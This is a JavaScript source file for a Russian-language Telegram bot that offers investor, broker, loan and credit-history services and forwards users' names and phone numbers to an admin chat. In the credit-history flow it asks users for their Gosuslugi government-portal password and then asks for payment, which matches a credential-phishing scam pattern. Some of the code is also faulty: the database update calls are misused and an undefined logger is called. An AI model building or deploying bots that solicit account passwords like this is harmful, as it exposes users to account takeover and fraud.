import { Telegraf, session } from 'telegraf'
import { getInlineKeyboard } from './services/bot/_helper.js'
import { COMMANDS, PROVIDER_TOKEN_PAYMENTS } from './global/config.js'
import config from './global/config.js'
import TG from './models/TG.js'
import { getInvoice } from './invoice.js'

const { BOT_TOKEN, CHAT_ID} = config
const bot =  new Telegraf(BOT_TOKEN)

let sendPhone = ctx => {
  ctx.reply('Отправьте ваш номер телефона', {
    parse_mode: 'HTML',
    reply_markup: JSON.stringify({
      keyboard: [
        [
          {text: '📱 Отправить номер', request_contact: true}
        ]
      ],
      one_time_keyboard: true,
      resize_keyboard: true
    })
  })
}

bot.use(session())

bot.start((ctx) => {
  const keyboard = [
    [{ text: '💸 Я Инвестор', callback_data: COMMANDS.invest }],
    [{ text: '📈 Я Брокер', callback_data: COMMANDS.broker }],
    [{ text: '📊 Мне нужен кредит', callback_data: COMMANDS.zalog }],
    [{ text: '📊 Мне нужна кредитная история', callback_data: COMMANDS.credit }]
  ]
  return ctx.reply(`Добро пожаловать, выберите пожалуйста интересующий вас тип услуги`, getInlineKeyboard({ keyboard }))
})
bot.on('message', async(ctx, next) => {
  if (ctx.message.text?.startsWith('/name')) {
    const chatId = ctx.message.chat.id
    const name = ctx.update.message.text.split(' ')[1]
    const user = await TG.find( {chatId: chatId} )
    if (user) {
      const x = await TG.findOneAndUpdate({ chatId: chatId,  first_name: name })
    }
  }
  if (ctx.message.text?.startsWith('/surname')) {
    const chatId = ctx.message.chat.id
    const surname = ctx.update.message.text.split(' ')[1]
    const user = await TG.find( {chatId: chatId} )
    if (user ) {
      const x = await TG.findOneAndUpdate({ chatId: chatId,  last_name: surname })
    }
  }

  if(ctx.message.text?.startsWith('/phone')) {
    sendPhone(ctx);
  }

  if(ctx.message.text?.startsWith('/admin')) {
    sendPhone(ctx);
  }

  if (ctx.message.contact || (ctx.message.text?.startsWith('+') && parseInt(ctx.message.text?.slice(1)))) {
    const chatId = ctx.message.chat.id
    const phone = ctx.message.contact?.phone_number ??  ctx.message.text
    const user = await TG.find( {chatId: chatId} )
    if (user ) {
      const x = await TG.findOneAndUpdate({ chatId: chatId,  phone: phone })
    }

    if (ctx.session != undefined)
      ctx.session.nextCommand = 'password'
  }
  if (ctx.message.text?.startsWith('/send')) {
    const chatId = ctx.message.chat.id
    const x = await TG.find({ chatId: chatId})
    for (const user of x) {
      const { first_name, last_name, phone, type } = user
      const text = `Имя: ${first_name} \nФамилия: ${last_name} \nНомер телефона: ${phone} \nТип услуги: ${type}`
      ctx.telegram.sendMessage(CHAT_ID, text)
      ctx.reply('Ваша заявка отправлена, ожидайте ответа')
    }
  }

  if (ctx.session?.scenario === COMMANDS.credit 
    && ctx.session?.nextCommand === 'password') {
    ctx.reply('Напишите ваш пароль от госуслуг', {
      parse_mode: 'HTML',
      reply_markup: JSON.stringify({
        keyboard: [
          [
            { text: 'Отправить пароль'},
          ]
        ],
        resize_keyboard: true
      })
    })
    ctx.session.nextCommand = 'sendLoginDataToGosuslugi'

  } else if (ctx.session?.nextCommand === 'sendLoginDataToGosuslugi') {
    ctx.session.nextCommand = 'pay'
    let keyboard = []
    Object.keys(PROVIDER_TOKEN_PAYMENTS).forEach(payment => keyboard.push([{text: PROVIDER_TOKEN_PAYMENTS[payment].name, callback_data: payment}]));

    ctx.reply("Оплатите услугу получения КИ", getInlineKeyboard({keyboard}));

  }

  return await next();
})
bot.on('callback_query', onSentInvoice)
bot.on('callback_query', onNewCommand)

async function onSentInvoice(ctx, next) {
  if (ctx.session?.nextCommand === 'pay' 
    && ctx.session?.scenario === COMMANDS.credit) {
    let invoice = getInvoice(ctx.from.id, PROVIDER_TOKEN_PAYMENTS[ctx.update.callback_query.data].token);

    return ctx.replyWithInvoice(invoice)
  }

  return next()
}

async function onNewCommand(ctx, next) {
  ctx.session = {scenario: null, nextCommand: null}
  const command = ctx.update.callback_query.data
  if (command === COMMANDS.invest) {
    ctx.reply('Для того что бы получать заявки давайте пройдем регистрацию\nДля этого вам нужно будет заполнить анкету\nВведите ваше имя в формате: /name Иван\nВведите вашу фамилию в формате: /surname Иванов\nДля того что бы отправить номер телефона введите команду /phone, и нажмине на кнопку ниже\nДля того что бы отправить заявку нажмите или  введите команду /send')
    TG.create({ type: COMMANDS.invest, chatId: ctx.update.callback_query.message.chat.id })
  }
  if (command === COMMANDS.broker) {
    ctx.reply('Для того что бы получать заявки давайте пройдем регистрацию\nДля этого вам нужно будет заполнить анкету\nВведите ваше имя в формате: /name Иван\nВведите вашу фамилию в формате: /surname Иванов\nДля того что бы отправить номер телефона введите команду /phone, и нажмине на кнопку ниже\nДля того что бы отправить заявку нажмите или введите команду /send')
    TG.create({ type: COMMANDS.broker, chatId: ctx.update.callback_query.message.chat.id })
  }
  if (command === COMMANDS.zalog) {
    ctx.reply('Для того что бы получать заявки давайте пройдем регистрацию\nДля этого вам нужно будет заполнить анкету\nВведите ваше имя в формате: /name Иван\nВведите вашу фамилию в формате: /surname Иванов\nДля того что бы отправить номер телефона введите команду /phone, и нажмине на кнопку ниже\nДля того что бы отправить заявку нажмите или введите команду /send')
    TG.create({ type: COMMANDS.zalog, chatId: ctx.update.callback_query.message.chat.id })
  }
  if (command === COMMANDS.credit) {
    ctx.reply('Для получения кредитной истории необходимо ввести номер телефона и пароль от вашего личного кабинета в системе Госуслуги')
    TG.create({ type: COMMANDS.credit, chatId: ctx.update.callback_query.message.chat.id })
    sendPhone(ctx)
    ctx.session.scenario = COMMANDS.credit;
  }

  return next();
}

bot.onError = function(err){
  log.error('Server error:', err)
  throw err
}

bot.launch()
console.log('Bot started')

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))

export default bot
